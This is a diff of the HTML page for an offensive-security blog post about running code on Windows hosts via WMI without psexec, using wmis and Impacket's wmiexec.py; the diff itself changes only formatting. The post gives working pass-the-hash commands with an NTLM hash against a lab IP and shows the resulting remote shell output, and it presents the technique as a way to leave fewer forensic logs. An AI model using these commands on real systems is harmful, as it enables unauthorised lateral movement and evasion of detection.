@@ -8,7 +8,7 @@
     content="">
 <meta name="description"
     content="PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all &amp;ldquo;psexec&amp;rdquo; tools work is:
- (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&amp;rsquo;s tool) to the ADMIN$ share Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one." />
+ (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&#39;s tool) to the ADMIN$ share Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://malicious.link/post/2014/2014-04-19-executing-code-via-smb-without-psexec/" />
@@ -28,7 +28,7 @@
     type="text/css">
 
 
-<link rel="stylesheet" href="https://malicious.link/scss/main.min.099699ab246bf26f50616f7c9f00c79d46110459d1bd727b2d07d6fc09ece082.css">
+<link rel="stylesheet" href="https://malicious.link/scss/main.min.48be1f41dc1d94d27b5663b2b359c895efd7696597f656e57d8f6c0e126c0563.css">
 
 
 
@@ -40,20 +40,17 @@
 <link rel="shortcut icon" href="/favicon.ico">
 <meta name="theme-color" content="#252627"><meta itemprop="name" content="Executing code via SMB / DCOM without PSEXEC">
 <meta itemprop="description" content="PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all &ldquo;psexec&rdquo; tools work is:
- (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&rsquo;s tool) to the ADMIN$ share Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one.">
-
-
+ (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&#39;s tool) to the ADMIN$ share Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one.">
 <meta itemprop="datePublished" content="2014-04-19T21:36:21-04:00" />
 <meta itemprop="dateModified" content="2014-04-19T21:36:21-04:00" />
 <meta itemprop="wordCount" content="580">
 
 
 
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Executing code via SMB / DCOM without PSEXEC"/>
 <meta name="twitter:description" content="PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all &ldquo;psexec&rdquo; tools work is:
- (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&rsquo;s tool) to the ADMIN$ share Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one."/>
+ (Optional) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&#39;s tool) to the ADMIN$ share Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one."/>
 
 
 
@@ -128,41 +125,27 @@
             
 
             <div class="post-content">
-                
-
-<p>PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all &ldquo;psexec&rdquo; tools work is:</p>
-
+                <p>PSEXEC has been a staple for Windows post exploitation pivoting and system administration for a long while. The basic premise of how all &ldquo;psexec&rdquo; tools work is:</p>
 <ol>
-<li>(<em>Optional</em>) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal&rsquo;s tool) to the ADMIN$ share</li>
+<li>(<em>Optional</em>) Upload a service executable (PSEXECSVC.EXE in the case of SysInternal's tool) to the ADMIN$ share</li>
 <li>Connect to the service manager on the remote host, and create a service based on either a local (to the remote system) executable or the uploaded one.</li>
 <li>Run the service</li>
 <li>Stop and delete the service and uploaded file pulling down the resulting output if any from the execution.</li>
 </ol>
-
 <p>Now, as you can guess, the uploading of a file, creating, starting, stopping, and deletion of services create quite the logs and forensic evidence.</p>
-
 <p>As you might imagine, thats not the best thing for us on the offensive side of infosec. Luckily big brother Microsoft provides another option, WMI (Windows Management Interface). I demonstrated the use of this in the past: <a href="/blog/2013/06/10/volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/">HERE</a> and <a href="/blog/2013/10/06/dumping-a-domain-worth-of-passwords-with-mimikatz/">HERE</a></p>
-
-<p>The downside to using the WMIC directly is that you need a valid token or a valid password for it to work. Passing the hash didn&rsquo;t used to be an available option.</p>
-
+<p>The downside to using the WMIC directly is that you need a valid token or a valid password for it to work. Passing the hash didn't used to be an available option.</p>
 <p>That has changed with the &ldquo;wmis&rdquo; package on Kali Linux that incorporates the <a href="http://passing-the-hash.blogspot.com/2013/07/WMIS-PowerSploit-Shells.html">&ldquo;Pass-the-Hash for 15 years toolkit&rdquo;</a></p>
-
 <p>(There is a slight problem where you have to play with it a bit to get it working on 64 bit Kali)</p>
-
 <p>The other solution is supplied as an example in the <a href="http://corelabs.coresecurity.com/index.php?module=Wiki&amp;action=view&amp;type=tool&amp;name=Impacket">Impacket library</a> <a href="https://code.google.com/p/impacket/source/browse/trunk/examples/wmiexec.py">&ldquo;wmiexec.py&rdquo;</a>. In my experience there are a few features that make it the better option.</p>
-
 <ol>
-<li>Installing it on a random VPS is dead simple and doesn&rsquo;t need the Kali repos to get right, nor Debian/Ubuntu.</li>
+<li>Installing it on a random VPS is dead simple and doesn't need the Kali repos to get right, nor Debian/Ubuntu.</li>
 <li>It defaults to an &ldquo;semi-interactive shell&rdquo; which writes and reads output from the ADMIN$ shell by default. Something I would normally have to do manually with a bunch of tools</li>
 <li>As with the WMIS package, it allows you to just create a process without the ADMIN$ write/read.</li>
 </ol>
-
 <p>Enough crazy talk here is an example usage of each:</p>
-
 <h2 id="wmis">WMIS</h2>
-
 <h3 id="usage">Usage:</h3>
-
 <pre><code>root@wpad:~# wmis
 Usage: [-?NPV] [-?|--help] [--usage] [-d|--debuglevel=DEBUGLEVEL] [--debug-stderr] [-s|--configfile=CONFIGFILE]
         [--option=name=value] [-l|--log-basename=LOGFILEBASE] [--leak-report] [--leak-report-full]
@@ -174,23 +157,15 @@ Usage: [-?NPV] [-?|--help] [--usage] [-d|--debuglevel=DEBUGLEVEL] [--debug-stder
         //host
 
 Example: wmis -U [domain/]adminuser%password //host cmd.exe /c dir c:\ &gt; c:\windows\temp\output.txt 
-</code></pre>
-
-<h2 id="example">Example:</h2>
-
+</code></pre><h2 id="example">Example:</h2>
 <pre><code>root@wpad:~# wmis -U administrator%aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 //172.16.102.141 calc.exe
 HASH PASS: Substituting user supplied NTLM HASH...
 HASH PASS: Substituting user supplied NTLM HASH...
 [wmi/wmis.c:172:main()] 1: calc.exe
 NTSTATUS: NT_STATUS_OK - Success
-</code></pre>
-
-<h2 id="wmiexec-py">wmiexec.py</h2>
-
+</code></pre><h2 id="wmiexecpy">wmiexec.py</h2>
 <p>Using a password, but with hashes you just tell it <code>-hashes</code> :</p>
-
 <h3 id="usage-1">Usage:</h3>
-
 <pre><code>root@wpad:~/impacket/examples# ./wmiexec.py 
 Impacket v0.9.12-dev - Copyright 2002-2014 Core Security Technologies
 
@@ -213,10 +188,7 @@ authentication:
   -hashes LMHASH:NTHASH
                         NTLM hashes, format is LMHASH:NTHASH
 
-</code></pre>
-
-<h3 id="example-1">Example:</h3>
-
+</code></pre><h3 id="example-1">Example:</h3>
 <pre><code>root@wpad:~/impacket/examples# ./wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:88e4d9fabaecf3dec18dd80905521b29 administrator@172.16.102.141
 Impacket v0.9.12-dev - Copyright 2002-2014 Core Security Technologies
 
@@ -239,7 +211,6 @@ C:\&gt;dir
 C:\&gt;
 
 </code></pre>
-
             </div>
         </article>
 
@@ -260,7 +231,7 @@ C:\&gt;
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2019</span>
+            <span>&copy; 2020</span>
             
             <span></span>
             <span> <a href="https://malicious.link/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
